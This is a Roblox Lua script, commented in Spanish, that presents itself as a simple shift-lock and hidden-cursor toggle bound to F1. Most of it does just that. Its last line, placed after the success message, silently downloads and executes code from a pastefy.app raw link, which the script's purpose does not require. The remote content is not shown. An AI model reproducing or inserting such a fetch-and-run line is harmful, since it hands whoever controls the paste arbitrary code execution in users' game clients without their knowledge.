-- Shift Lock + Mouse oculto (simple)
-- F1 = Activar / Desactivar

local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local enabled = true
local connection

local function activar()
	UIS.MouseIconEnabled = false
	UIS.MouseBehavior = Enum.MouseBehavior.LockCenter

	if connection then
		connection:Disconnect()
		connection = nil
	end

	connection = RunService.RenderStepped:Connect(function()
		if not enabled then return end
		UIS.MouseIconEnabled = false
		UIS.MouseBehavior = Enum.MouseBehavior.LockCenter

		local character = player.Character
		if character then
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if humanoid and humanoid.Health > 0 then
				humanoid.AutoRotate = false
			end
		end
	end)
end

local function desactivar()
	if connection then
		connection:Disconnect()
		connection = nil
	end

	UIS.MouseIconEnabled = true
	UIS.MouseBehavior = Enum.MouseBehavior.Default

	local character = player.Character
	if character then
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid.AutoRotate = true
		end
	end
end

-- Activar al inicio
activar()

-- F1 para activar / desactivar
UIS.InputBegan:Connect(function(input, processed)
	if processed then return end
	if input.KeyCode == Enum.KeyCode.F1 then
		enabled = not enabled
		if enabled then
			activar()
		else
			desactivar()
		end
	end
end)

print("✅ Shift Lock activado | F1 para desactivar")

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()